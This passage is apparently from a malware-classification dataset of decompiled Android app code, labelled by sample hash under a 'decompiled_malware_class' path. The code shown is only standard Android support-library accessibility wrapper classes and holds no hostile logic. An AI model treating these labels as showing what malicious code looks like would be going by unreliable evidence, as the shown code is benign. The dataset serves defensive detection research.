void setChecked(  Object obj,  boolean z);   void setClassName(  Object obj,  CharSequence charSequence);   void setClickable(  Object obj,  boolean z);   void setContentDescription(  Object obj,  CharSequence charSequence);   void setEnabled(  Object obj,  boolean z);   void setFocusable(  Object obj,  boolean z);   void setFocused(  Object obj,  boolean z);   void setLongClickable(  Object obj,  boolean z);   void setMovementGranularities(  Object obj,  int i);   void setPackageName(  Object obj,  CharSequence charSequence);   void setParent(  Object obj,  View view);   void setParent(  Object obj,  View view,  int i);   void setPassword(  Object obj,  boolean z);   void setScrollable(  Object obj,  boolean z);   void setSelected(  Object obj,  boolean z);   void setSource(  Object obj,  View view);   void setSource(  Object obj,  View view,  int i);   void setText(  Object obj,  CharSequence charSequence);   void setVisibleToUser(  Object obj,  boolean z); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityNodeInfoJellybeanImpl.code","static class AccessibilityNodeInfoJellybeanImpl extends AccessibilityNodeInfoIcsImpl {   AccessibilityNodeInfoJellybeanImpl(){   }   @Override public Object obtain(  View root,  int virtualDescendantId){     return AccessibilityNodeInfoCompatJellyBean.obtain(root,virtualDescendantId);   }   @Override public Object findFocus(  Object info,  int focus){     return AccessibilityNodeInfoCompatJellyBean.findFocus(info,focus);   }   @Override public Object focusSearch(  Object info,  int direction){     return AccessibilityNodeInfoCompatJellyBean.focusSearch(info,direction);   }   @Override public void addChild(  Object info,  View child,  int virtualDescendantId){     AccessibilityNodeInfoCompatJellyBean.addChild(info,child,virtualDescendantId);   }   @Override public void setSource(  Object info,  View root,  int virtualDescendantId){     AccessibilityNodeInfoCompatJellyBean.setSource(info,root,virtualDescendantId);   }   @Override public boolean isVisibleToUser(  Object info){     return AccessibilityNodeInfoCompatJellyBean.isVisibleToUser(info);   }   @Override public void setVisibleToUser(  Object info,  boolean visibleToUser){     AccessibilityNodeInfoCompatJellyBean.setVisibleToUser(info,visibleToUser);   }   @Override public boolean isAccessibilityFocused(  Object info){     return AccessibilityNodeInfoCompatJellyBean.isAccessibilityFocused(info);   }   @Override public void setAccessibilityFocused(  Object info,  boolean focused){     AccessibilityNodeInfoCompatJellyBean.setAccesibilityFocused(info,focused);   }   @Override public boolean performAction(  Object info,  int action,  Bundle arguments){     return AccessibilityNodeInfoCompatJellyBean.performAction(info,action,arguments);   }   @Override public void setMovementGranularities(  Object info,  int granularities){     AccessibilityNodeInfoCompatJellyBean.setMovementGranularities(info,granularities);   }   @Override public int getMovementGranularities(  Object info){     return AccessibilityNodeInfoCompatJellyBean.getMovementGranularities(info);   }   @Override public void setParent(  Object info,  View root,  int virtualDescendantId){     AccessibilityNodeInfoCompatJellyBean.setParent(info,root,virtualDescendantId);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityNodeInfoStubImpl.code","static class AccessibilityNodeInfoStubImpl implements AccessibilityNodeInfoImpl {   AccessibilityNodeInfoStubImpl(){   }   @Override public Object obtain(){     return null;   }   @Override public Object obtain(  View source){     return null;   }   @Override public Object obtain(  View root,  int virtualDescendantId){     return null;   }   @Override public Object obtain(  Object info){     return null;   }   @Override public void addAction(  Object info,  int action){   }   @Override public void addChild(  Object info,  View child){   }   @Override public void addChild(  Object info,  View child,  int virtualDescendantId){   }   @Override public List<Object> findAccessibilityNodeInfosByText(  Object info,  String text){     return Collections.emptyList();   }   @Override public int getActions(  Object info){     return 0;   }   @Override public void getBoundsInParent(  Object info,  Rect outBounds){   }   @Override public void getBoundsInScreen(  Object info,  Rect outBounds){   }   @Override public Object getChild(  Object info,  int index){     return null;   }   @Override public int getChildCount(  Object info){     return 0;   }   @Override public CharSequence getClassName(  Object info){     return null;   }   @Override public CharSequence getContentDescription(  Object info){     return null;   }   @Override public CharSequence getPackageName(  Object info){     return null;   }   @Override public Object getParent(  Object info){     return null;   }   @Override public CharSequence getText(  Object info){     return null;   }   @Override public int getWindowId(  Object info){     return 0;   }   @Override public boolean isCheckable(  Object info){     return false;   }   @Override public boolean isChecked(  Object info){     return false;   }   @Override public boolean isClickable(  Object info){     return false;   }   @Override public boolean isEnabled(  Object info){     return false;   }   @Override public boolean isFocusable(  Object info){     return false;   }   @Override public boolean isFocused(  Object info){     return false;   }   @Override public boolean isVisibleToUser(  Object info){     return false;   }   @Override public boolean isAccessibilityFocused(  Object info){     return false;   }   @Override public boolean isLongClickable(  Object info){     return false;   }   @Override public boolean isPassword(  Object info){     return false;   }   @Override public boolean isScrollable(  Object info){     return false;   }   @Override public boolean isSelected(  Object info){     return false;   }   @Override public boolean performAction(  Object info,  int action){     return false;   }   @Override public boolean performAction(  Object info,  int action,  Bundle arguments){     return false;   }   @Override public void setMovementGranularities(  Object info,  int granularities){   }   @Override public int getMovementGranularities(  Object info){     return 0;   }   @Override public void setBoundsInParent(  Object info,  Rect bounds){   }   @Override public void setBoundsInScreen(  Object info,  Rect bounds){   }   @Override public void setCheckable(  Object info,  boolean checkable){   }   @Override public void setChecked(  Object info,  boolean checked){   }   @Override public void setClassName(  Object info,  CharSequence className){   }   @Override public void setClickable(  Object info,  boolean clickable){   }   @Override public void setContentDescription(  Object info,  CharSequence contentDescription){   }   @Override public void setEnabled(  Object info,  boolean enabled){   }   @Override public void setFocusable(  Object info,  boolean focusable){   }   @Override public void setFocused(  Object info,  boolean focused){   }   @Override public void setVisibleToUser(  Object info,  boolean visibleToUser){   }   @Override public void setAccessibilityFocused(  Object info,  boolean focused){   }   @Override public void setLongClickable(  Object info,  boolean longClickable){   }   @Override public void setPackageName(  Object info,  CharSequence packageName){   }   @Override public void setParent(  Object info,  View parent){   }   @Override public void setPassword(  Object info,  boolean password){   }   @Override public void setScrollable(  Object info,  boolean scrollable){   }   @Override public void setSelected(  Object info,  boolean selected){   }   @Override public void setSource(  Object info,  View source){   }   @Override public void setSource(  Object info,  View root,  int virtualDescendantId){   }   @Override public Object findFocus(  Object info,  int focus){     return null;   }   @Override public Object focusSearch(  Object info,  int direction){     return null;   }   @Override public void setText(  Object info,  CharSequence text){   }   @Override public void recycle(  Object info){   }   @Override public void setParent(  Object info,  View root,  int virtualDescendantId){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityNodeProviderCompat.code","public class AccessibilityNodeProviderCompat {   private static final AccessibilityNodeProviderImpl IMPL;   private final Object mProvider; interface AccessibilityNodeProviderImpl {     Object newAccessibilityNodeProviderBridge(    AccessibilityNodeProviderCompat accessibilityNodeProviderCompat);   } static class AccessibilityNodeProviderStubImpl implements AccessibilityNodeProviderImpl {     AccessibilityNodeProviderStubImpl(){     }     @Override public Object newAccessibilityNodeProviderBridge(    AccessibilityNodeProviderCompat compat){       return null;     }   } static class AccessibilityNodeProviderJellyBeanImpl extends AccessibilityNodeProviderStubImpl {     AccessibilityNodeProviderJellyBeanImpl(){     }     @Override public Object newAccessibilityNodeProviderBridge(    final AccessibilityNodeProviderCompat compat){       return AccessibilityNodeProviderCompatJellyBean.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatJellyBean.AccessibilityNodeInfoBridge(){         @Override public boolean performAction(        int virtualViewId,        int action,        Bundle arguments){           return compat.performAction(virtualViewId,action,arguments);         }         @Override public List<Object> findAccessibilityNodeInfosByText(        String text,        int virtualViewId){           List<AccessibilityNodeInfoCompat> compatInfos=compat.findAccessibilityNodeInfosByText(text,virtualViewId);           List<Object> infos=new ArrayList<>();           int infoCount=compatInfos.size();           for (int i=0; i < infoCount; i++) {             AccessibilityNodeInfoCompat infoCompat=compatInfos.get(i);             infos.add(infoCompat.getInfo());           }           return infos;         }         @Override public Object createAccessibilityNodeInfo(        int virtualViewId){           AccessibilityNodeInfoCompat compatInfo=compat.createAccessibilityNodeInfo(virtualViewId);           if (compatInfo == null) {             return null;           }           return compatInfo.getInfo();         }       } );     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityNodeProviderJellyBeanImpl();     }  else {       IMPL=new AccessibilityNodeProviderStubImpl();     }   }   public AccessibilityNodeProviderCompat(){     this.mProvider=IMPL.newAccessibilityNodeProviderBridge(this);   }   public AccessibilityNodeProviderCompat(  Object provider){     this.mProvider=provider;   }   public Object getProvider(){     return this.mProvider;   }   public AccessibilityNodeInfoCompat createAccessibilityNodeInfo(  int virtualViewId){     return null;   }   public boolean performAction(  int virtualViewId,  int action,  Bundle arguments){     return false;   }   public List<AccessibilityNodeInfoCompat> findAccessibilityNodeInfosByText(  String text,  int virtualViewId){     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityNodeProviderCompatJellyBean.code","class AccessibilityNodeProviderCompatJellyBean { interface AccessibilityNodeInfoBridge {     Object createAccessibilityNodeInfo(    int i);     List<Object> findAccessibilityNodeInfosByText(    String str,    int i);     boolean performAction(    int i,    int i2,    Bundle bundle);   }   AccessibilityNodeProviderCompatJellyBean(){   }   public static Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeInfoBridge bridge){     return new AccessibilityNodeProvider(){       @Override public AccessibilityNodeInfo createAccessibilityNodeInfo(      int virtualViewId){         return (AccessibilityNodeInfo)AccessibilityNodeInfoBridge.this.createAccessibilityNodeInfo(virtualViewId);       }       @Override public List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText(      String text,      int virtualViewId){         return AccessibilityNodeInfoBridge.this.findAccessibilityNodeInfosByText(text,virtualViewId);       }       @Override public boolean performAction(      int virtualViewId,      int action,      Bundle arguments){         return AccessibilityNodeInfoBridge.this.performAction(virtualViewId,action,arguments);       }     } ;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityNodeProviderImpl.code","interface AccessibilityNodeProviderImpl {   Object newAccessibilityNodeProviderBridge(  AccessibilityNodeProviderCompat accessibilityNodeProviderCompat); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityNodeProviderJellyBeanImpl.code","static class AccessibilityNodeProviderJellyBeanImpl extends AccessibilityNodeProviderStubImpl {   AccessibilityNodeProviderJellyBeanImpl(){   }   @Override public Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeProviderCompat compat){     return AccessibilityNodeProviderCompatJellyBean.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatJellyBean.AccessibilityNodeInfoBridge(){       @Override public boolean performAction(      int virtualViewId,      int action,      Bundle arguments){         return compat.performAction(virtualViewId,action,arguments);       }       @Override public List<Object> findAccessibilityNodeInfosByText(      String text,      int virtualViewId){         List<AccessibilityNodeInfoCompat> compatInfos=compat.findAccessibilityNodeInfosByText(text,virtualViewId);         List<Object> infos=new ArrayList<>();         int infoCount=compatInfos.size();         for (int i=0; i < infoCount; i++) {           AccessibilityNodeInfoCompat infoCompat=compatInfos.get(i);           infos.add(infoCompat.getInfo());         }         return infos;       }       @Override public Object createAccessibilityNodeInfo(      int virtualViewId){         AccessibilityNodeInfoCompat compatInfo=compat.createAccessibilityNodeInfo(virtualViewId);         if (compatInfo == null) {           return null;         }         return compatInfo.getInfo();       }     } );   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityNodeProviderStubImpl.code","static class AccessibilityNodeProviderStubImpl implements AccessibilityNodeProviderImpl {   AccessibilityNodeProviderStubImpl(){   }   @Override public Object newAccessibilityNodeProviderBridge(  AccessibilityNodeProviderCompat compat){     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityRecordCompat.code","public class AccessibilityRecordCompat {   private static final AccessibilityRecordImpl IMPL;   private final Object mRecord; interface AccessibilityRecordImpl {     int getAddedCount(    Object obj);     CharSequence getBeforeText(    Object obj);     CharSequence getClassName(    Object obj);     CharSequence getContentDescription(    Object obj);     int getCurrentItemIndex(    Object obj);     int getFromIndex(    Object obj);     int getItemCount(    Object obj);     int getMaxScrollX(    Object obj);     int getMaxScrollY(    Object obj);     Parcelable getParcelableData(    Object obj);     int getRemovedCount(    Object obj);     int getScrollX(    Object obj);     int getScrollY(    Object obj);     AccessibilityNodeInfoCompat getSource(    Object obj);     List<CharSequence> getText(    Object obj);     int getToIndex(    Object obj);     int getWindowId(    Object obj);     boolean isChecked(    Object obj);     boolean isEnabled(    Object obj);     boolean isFullScreen(    Object obj);     boolean isPassword(    Object obj);     boolean isScrollable(    Object obj);     Object obtain();     Object obtain(    Object obj);     void recycle(    Object obj);     void setAddedCount(    Object obj,    int i);     void setBeforeText(    Object obj,    CharSequence charSequence);     void setChecked(    Object obj,    boolean z);     void setClassName(    Object obj,    CharSequence charSequence);     void setContentDescription(    Object obj,    CharSequence charSequence);     void setCurrentItemIndex(    Object obj,    int i);     void setEnabled(    Object obj,    boolean z);     void setFromIndex(    Object obj,    int i);     void setFullScreen(    Object obj,    boolean z);     void setItemCount(    Object obj,    int i);     void setMaxScrollX(    Object obj,    int i);     void setMaxScrollY(    Object obj,    int i);     void setParcelableData(    Object obj,    Parcelable parcelable);     void setPassword(    Object obj,    boolean z);     void setRemovedCount(    Object obj,    int i);     void setScrollX(    Object obj,    int i);     void setScrollY(    Object obj,    int i);     void setScrollable(    Object obj,    boolean z);     void setSource(    Object obj,    View view);     void setSource(    Object obj,    View view,    int i);     void setToIndex(    Object obj,    int i);   } static class AccessibilityRecordStubImpl implements AccessibilityRecordImpl {     AccessibilityRecordStubImpl(){     }     @Override public Object obtain(){       return null;     }     @Override public Object obtain(    Object record){       return null;     }     @Override public int getAddedCount(    Object record){       return 0;     }     @Override public CharSequence getBeforeText(    Object record){       return null;     }     @Override public CharSequence getClassName(    Object record){       return null;     }     @Override public CharSequence getContentDescription(    Object record){       return null;     }     @Override public int getCurrentItemIndex(    Object record){       return 0;     }     @Override public int getFromIndex(    Object record){       return 0;     }     @Override public int getItemCount(    Object record){       return 0;     }     @Override public int getMaxScrollX(    Object record){       return 0;     }     @Override public int getMaxScrollY(    Object record){       return 0;     }     @Override public Parcelable getParcelableData(    Object record){       return null;     }     @Override public int getRemovedCount(    Object record){       return 0;     }     @Override public int getScrollX(    Object record){       return 0;     }     @Override public int getScrollY(    Object record){       return 0;     }     @Override public AccessibilityNodeInfoCompat getSource(    Object record){       return null;     }     @Override public List<CharSequence> getText(    Object record){       return Collections.emptyList();     }     @Override public int getToIndex(    Object record){       return 0;     }     @Override public int getWindowId(    Object record){       return 0;     }     @Override public boolean isChecked(    Object record){       return false;     }     @Override public boolean isEnabled(    Object record){       return false;     }     @Override public boolean isFullScreen(    Object record){       return false;     }     @Override public boolean isPassword(    Object record){       return false;     }     @Override public boolean isScrollable(    Object record){       return false;     }     @Override public void recycle(    Object record){     }     @Override public void setAddedCount(    Object record,    int addedCount){     }     @Override public void setBeforeText(    Object record,    CharSequence beforeText){     }     @Override public void setChecked(    Object record,    boolean isChecked){     }     @Override public void setClassName(    Object record,    CharSequence className){     }     @Override public void setContentDescription(    Object record,    CharSequence contentDescription){     }     @Override public void setCurrentItemIndex(    Object record,    int currentItemIndex){     }     @Override public void setEnabled(    Object record,    boolean isEnabled){     }     @Override public void setFromIndex(    Object record,    int fromIndex){     }     @Override public void setFullScreen(    Object record,    boolean isFullScreen){     }     @Override public void setItemCount(    Object record,    int itemCount){     }     @Override public void setMaxScrollX(    Object record,    int maxScrollX){     }     @Override public void setMaxScrollY(    Object record,    int maxScrollY){     }     @Override public void setParcelableData(    Object record,    Parcelable parcelableData){     }     @Override public void setPassword(    Object record,    boolean isPassword){     }     @Override public void setRemovedCount(    Object record,    int removedCount){     }     @Override public void setScrollX(    Object record,    int scrollX){     }     @Override public void setScrollY(    Object record,    int scrollY){     }     @Override public void setScrollable(    Object record,    boolean scrollable){     }     @Override public void setSource(    Object record,    View source){     }     @Override public void setSource(    Object record,    View root,    int virtualDescendantId){     }     @Override public void setToIndex(    Object record,    int toIndex){     }   } static class AccessibilityRecordIcsImpl extends AccessibilityRecordStubImpl {     AccessibilityRecordIcsImpl(){     }     @Override public Object obtain(){       return AccessibilityRecordCompatIcs.obtain();     }     @Override public Object obtain(    Object record){       return AccessibilityRecordCompatIcs.obtain(record);     }     @Override public int getAddedCount(    Object record){       return AccessibilityRecordCompatIcs.getAddedCount(record);     }     @Override public CharSequence getBeforeText(    Object record){       return AccessibilityRecordCompatIcs.getBeforeText(record);     }     @Override public CharSequence getClassName(    Object record){       return AccessibilityRecordCompatIcs.getClassName(record);     }     @Override public CharSequence getContentDescription(    Object record){       return AccessibilityRecordCompatIcs.getContentDescription(record);     }     @Override public int getCurrentItemIndex(    Object record){       return AccessibilityRecordCompatIcs.getCurrentItemIndex(record);     }     @Override public int getFromIndex(    Object record){       return AccessibilityRecordCompatIcs.getFromIndex(record);     }     @Override public int getItemCount(    Object record){       return AccessibilityRecordCompatIcs.getItemCount(record);     }     @Override public Parcelable getParcelableData(    Object record){       return AccessibilityRecordCompatIcs.getParcelableData(record);     }     @Override public int getRemovedCount(    Object record){       return AccessibilityRecordCompatIcs.getRemovedCount(record);     }     @Override public int getScrollX(    Object record){       return AccessibilityRecordCompatIcs.getScrollX(record);     }     @Override public int getScrollY(    Object record){       return AccessibilityRecordCompatIcs.getScrollY(record);     }     @Override public AccessibilityNodeInfoCompat getSource(    Object record){       return AccessibilityNodeInfoCompat.wrapNonNullInstance(AccessibilityRecordCompatIcs.getSource(record));     }     @Override public List<CharSequence> getText(    Object record){       return AccessibilityRecordCompatIcs.getText(record);     }     @Override public int getToIndex(    Object record){       return AccessibilityRecordCompatIcs.getToIndex(record);     }     @Override public int getWindowId(    Object record){       return AccessibilityRecordCompatIcs.getWindowId(record);     }     @Override public boolean isChecked(    Object record){       return AccessibilityRecordCompatIcs.isChecked(record);     }     @Override public boolean isEnabled(    Object record){       return AccessibilityRecordCompatIcs.isEnabled(record);     }     @Override public boolean isFullScreen(    Object record){       return AccessibilityRecordCompatIcs.isFullScreen(record);     }     @Override public boolean isPassword(    Object record){       return AccessibilityRecordCompatIcs.isPassword(record);     }     @Override public boolean isScrollable(    Object record){       return AccessibilityRecordCompatIcs.isScrollable(record);     }     @Override public void recycle(    Object record){       AccessibilityRecordCompatIcs.recycle(record);     }     @Override public void setAddedCount(    Object record,    int addedCount){       AccessibilityRecordCompatIcs.setAddedCount(record,addedCount);     }     @Override public void setBeforeText(    Object record,    CharSequence beforeText){       AccessibilityRecordCompatIcs.setBeforeText(record,beforeText);     }     @Override public void setChecked(    Object record,    boolean isChecked){       AccessibilityRecordCompatIcs.setChecked(record,isChecked);     }     @Override public void setClassName(    Object record,    CharSequence className){       AccessibilityRecordCompatIcs.setClassName(record,className);     }     @Override public void setContentDescription(    Object record,    CharSequence contentDescription){       AccessibilityRecordCompatIcs.setContentDescription(record,contentDescription);     }     @Override public void setCurrentItemIndex(    Object record,    int currentItemIndex){       AccessibilityRecordCompatIcs.setCurrentItemIndex(record,currentItemIndex);     }     @Override public void setEnabled(    Object record,    boolean isEnabled){       AccessibilityRecordCompatIcs.setEnabled(record,isEnabled);     }     @Override public void setFromIndex(    Object record,    int fromIndex){       AccessibilityRecordCompatIcs.setFromIndex(record,fromIndex);     }     @Override public void setFullScreen(    Object record,    boolean isFullScreen){       AccessibilityRecordCompatIcs.setFullScreen(record,isFullScreen);     }     @Override public void setItemCount(    Object record,    int itemCount){       AccessibilityRecordCompatIcs.setItemCount(record,itemCount);     }     @Override public void setParcelableData(    Object record,    Parcelable parcelableData){       AccessibilityRecordCompatIcs.setParcelableData(record,parcelableData);     }     @Override public void setPassword(    Object record,    boolean isPassword){       AccessibilityRecordCompatIcs.setPassword(record,isPassword);     }     @Override public void setRemovedCount(    Object record,    int removedCount){       AccessibilityRecordCompatIcs.setRemovedCount(record,removedCount);     }     @Override public void setScrollX(    Object record,    int scrollX){       AccessibilityRecordCompatIcs.setScrollX(record,scrollX);     }     @Override public void setScrollY(    Object record,    int scrollY){       AccessibilityRecordCompatIcs.setScrollY(record,scrollY);     }     @Override public void setScrollable(    Object record,    boolean scrollable){       AccessibilityRecordCompatIcs.setScrollable(record,scrollable);     }     @Override public void setSource(    Object record,    View source){       AccessibilityRecordCompatIcs.setSource(record,source);     }     @Override public void setToIndex(    Object record,    int toIndex){       AccessibilityRecordCompatIcs.setToIndex(record,toIndex);     }   } static class AccessibilityRecordIcsMr1Impl extends AccessibilityRecordIcsImpl {     AccessibilityRecordIcsMr1Impl(){     }     @Override public int getMaxScrollX(    Object record){       return AccessibilityRecordCompatIcsMr1.getMaxScrollX(record);     }     @Override public int getMaxScrollY(    Object record){       return AccessibilityRecordCompatIcsMr1.getMaxScrollY(record);     }     @Override public void setMaxScrollX(    Object record,    int maxScrollX){       AccessibilityRecordCompatIcsMr1.setMaxScrollX(record,maxScrollX);     }     @Override public void setMaxScrollY(    Object record,    int maxScrollY){       AccessibilityRecordCompatIcsMr1.setMaxScrollY(record,maxScrollY);     }   } static class AccessibilityRecordJellyBeanImpl extends AccessibilityRecordIcsMr1Impl {     AccessibilityRecordJellyBeanImpl(){     }     @Override public void setSource(    Object record,    View root,    int virtualDescendantId){       AccessibilityRecordCompatJellyBean.setSource(record,root,virtualDescendantId);     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityRecordJellyBeanImpl();       return;     }     if (Build.VERSION.SDK_INT >= 15) {       IMPL=new AccessibilityRecordIcsMr1Impl();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityRecordIcsImpl();     }  else {       IMPL=new AccessibilityRecordStubImpl();     }   }   public AccessibilityRecordCompat(  Object record){     this.mRecord=record;   }   public Object getImpl(){     return this.mRecord;   }   public static AccessibilityRecordCompat obtain(  AccessibilityRecordCompat record){     return new AccessibilityRecordCompat(IMPL.obtain(record.mRecord));   }   public static AccessibilityRecordCompat obtain(){     return new AccessibilityRecordCompat(IMPL.obtain());   }   public void setSource(  View source){     IMPL.setSource(this.mRecord,source);   }   public void setSource(  View root,  int virtualDescendantId){     IMPL.setSource(this.mRecord,root,virtualDescendantId);   }   public AccessibilityNodeInfoCompat getSource(){     return IMPL.getSource(this.mRecord);   }   public int getWindowId(){     return IMPL.getWindowId(this.mRecord);   }   public boolean isChecked(){     return IMPL.isChecked(this.mRecord);   }   public void setChecked(  boolean isChecked){     IMPL.setChecked(this.mRecord,isChecked);   }   public boolean isEnabled(){     return IMPL.isEnabled(this.mRecord);   }   public void setEnabled(  boolean isEnabled){     IMPL.setEnabled(this.mRecord,isEnabled);   }   public boolean isPassword(){     return IMPL.isPassword(this.mRecord);   }   public void setPassword(  boolean isPassword){     IMPL.setPassword(this.mRecord,isPassword);   }   public boolean isFullScreen(){     return IMPL.isFullScreen(this.mRecord);   }   public void setFullScreen(  boolean isFullScreen){     IMPL.setFullScreen(this.mRecord,isFullScreen);   }   public boolean isScrollable(){     return IMPL.isScrollable(this.mRecord);   }   public void setScrollable(  boolean scrollable){     IMPL.setScrollable(this.mRecord,scrollable);   }   public int getItemCount(){     return IMPL.getItemCount(this.mRecord);   }   public void setItemCount(  int itemCount){     IMPL.setItemCount(this.mRecord,itemCount);   }   public int getCurrentItemIndex(){     return IMPL.getCurrentItemIndex(this.mRecord);   }   public void setCurrentItemIndex(  int currentItemIndex){     IMPL.setCurrentItemIndex(this.mRecord,currentItemIndex);   }   public int getFromIndex(){     return IMPL.getFromIndex(this.mRecord);   }   public void setFromIndex(  int fromIndex){     IMPL.setFromIndex(this.mRecord,fromIndex);   }   public int getToIndex(){     return IMPL.getToIndex(this.mRecord);   }   public void setToIndex(  int toIndex){     IMPL.setToIndex(this.mRecord,toIndex);   }   public int getScrollX(){     return IMPL.getScrollX(this.mRecord);   }   public void setScrollX(  int scrollX){     IMPL.setScrollX(this.mRecord,scrollX);   }   public int getScrollY(){     return IMPL.getScrollY(this.mRecord);   }   public void setScrollY(  int scrollY){     IMPL.setScrollY(this.mRecord,scrollY);   }   public int getMaxScrollX(){     return IMPL.getMaxScrollX(this.mRecord);   }   public void setMaxScrollX(  int maxScrollX){     IMPL.setMaxScrollX(this.mRecord,maxScrollX);   }   public int getMaxScrollY(){     return IMPL.getMaxScrollY(this.mRecord);   }   public void setMaxScrollY(  int maxScrollY){     IMPL.setMaxScrollY(this.mRecord,maxScrollY);   }   public int getAddedCount(){     return IMPL.getAddedCount(this.mRecord);   }   public void setAddedCount(  int addedCount){     IMPL.setAddedCount(this.mRecord,addedCount);   }   public int getRemovedCount(){     return IMPL.getRemovedCount(this.mRecord);   }   public void setRemovedCount(  int removedCount){     IMPL.setRemovedCount(this.mRecord,removedCount);   }   public CharSequence getClassName(){     return IMPL.getClassName(this.mRecord);   }   public void setClassName(  CharSequence className){     IMPL.setClassName(this.mRecord,className);   }   public List<CharSequence> getText(){     return IMPL.getText(this.mRecord);   }   public CharSequence getBeforeText(){     return IMPL.getBeforeText(this.mRecord);   }   public void setBeforeText(  CharSequence beforeText){     IMPL.setBeforeText(this.mRecord,beforeText);   }   public CharSequence getContentDescription(){     return IMPL.getContentDescription(this.mRecord);   }   public void setContentDescription(  CharSequence contentDescription){     IMPL.setContentDescription(this.mRecord,contentDescription);   }   public Parcelable getParcelableData(){     return IMPL.getParcelableData(this.mRecord);   }   public void setParcelableData(  Parcelable parcelableData){     IMPL.setParcelableData(this.mRecord,parcelableData);   }   public void recycle(){     IMPL.recycle(this.mRecord);   }   public int hashCode(){     if (this.mRecord == null) {       return 0;     }     return this.mRecord.hashCode();   }   public boolean equals(  Object obj){     if (this == obj) {       return true;     }     if (obj != null && getClass() == obj.getClass()) {       AccessibilityRecordCompat other=(AccessibilityRecordCompat)obj;       return this.mRecord == null ? other.mRecord == null : this.mRecord.equals(other.mRecord);     }     return false;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.view.accessibility\AccessibilityRecordCompatIcs.code","class AccessibilityRecordCompatIcs {   AccessibilityRecordCompatIcs(){   }   public static Object obtain(){     return AccessibilityRecord.obtain();   }   public static Object obtain(  Object record){     return AccessibilityRecord.obtain((AccessibilityRecord)record);   }   public static int getAddedCount(  Object record){     return ((AccessibilityRecord)record).getAddedCount();   }   public static CharSequence getBeforeText(  Object record){     return ((AccessibilityRecord)record).getBeforeText();   }   public static CharSequence getClassName(  Object record){     return ((AccessibilityRecord)record).getClassName();   }   public static CharSequence getContentDescription(  Object record){     return ((AccessibilityRecord)record).getContentDescription();   }   public static int getCurrentItemIndex(  Object record){     return ((AccessibilityRecord)record).getCurrentItemIndex();   }   public static int getFromIndex(  Object record){     return ((AccessibilityRecord)record).getFromIndex();   }   public static int getItemCount(  Object record){     return ((AccessibilityRecord)record).getItemCount();   }   public static Parcelable getParcelableData(  Object record){     return ((AccessibilityRecord)record).getParcelableData();   }   public static int getRemovedCount(  Object record){     return ((AccessibilityRecord)record).getRemovedCount();   }   public static int getScrollX(  Object record){     return ((AccessibilityRecord)record).getScrollX();   }   public static int getScrollY(  Object record){     return ((AccessibilityRecord)record).getScrollY();   }   public static Object getSource(  Object record){     return ((AccessibilityRecord)record).getSource();   }   public static List<CharSequence> getText(  Object record){     return ((AccessibilityRecord)record).getText();   }   public static int getToIndex(  Object record){     return ((AccessibilityRecord)record).getToIndex();   }   public static int getWindowId(  Object record){     return ((AccessibilityRecord)record).getWindowId();   }   public static boolean isChecked(  Object record){     return ((AccessibilityRecord)record).isChecked();   }   public static boolean isEnabled(  Object record){     return ((AccessibilityRecord)record).isEnabled();   }   public static boolean isFullScreen(  Object record){     return ((AccessibilityRecord)record).isFullScreen();   }   public static boolean isPassword(  Object record){     return ((AccessibilityRecord)record).isPassword();   }   public static boolean isScrollable(  Object record){     return ((AccessibilityRecord)record).isScrollable();   }   public static void recycle(  Object record){     ((AccessibilityRecord)record).recycle();   }   public static void setAddedCount(  Object record,  int addedCount){     ((AccessibilityRecord)record).setAddedCount(addedCount);   }   public static void setBeforeText(  Object record,  CharSequence beforeText){     ((AccessibilityRecord)record).setBeforeText(beforeText);   }   public static void setChecked(  Object record,  boolean isChecked){     ((AccessibilityRecord)record).setChecked(isChecked);   }   public static void setClassName(  Object record,  CharSequence className){     ((AccessibilityRecord)record).setClassName(className);   }   public static void setContentDescription(  Object record,  CharSequence contentDescription){     ((AccessibilityRecord)record).setContentDescription(contentDescription);   }   public static void setCurrentItemIndex(  Object record,  int currentItemIndex){     ((AccessibilityRecord)record).setCurrentItemIndex(currentItemIndex);   }   public static void setEnabled(  Object record,  boolean isEnabled){     ((AccessibilityRecord)record).setEnabled(isEnabled);   }   public static void setFromIndex(  Object record,  int fromIndex){     ((AccessibilityRecord)record).setFromIndex(fromIndex);   }   public static void setFullScreen(  Object record,  boolean isFullScreen){     ((AccessibilityRecord)record).setFullScreen(isFullScreen);   }   public static void setItemCount(  Object record,  int itemCount){     ((AccessibilityRecord)record).setItemCount(itemCount);   }   public static void setParcelableData(  Object record,  Parcelable parcelableData){     ((AccessibilityRecord)record).setParcelableData(parcelableData);   }   public static void setPassword(  Object record,  boolean isPassword){     ((AccessibilityRecord)record).setPassword(isPassword);   }   public static void setRemovedCount(  Object record,  int removedCount){     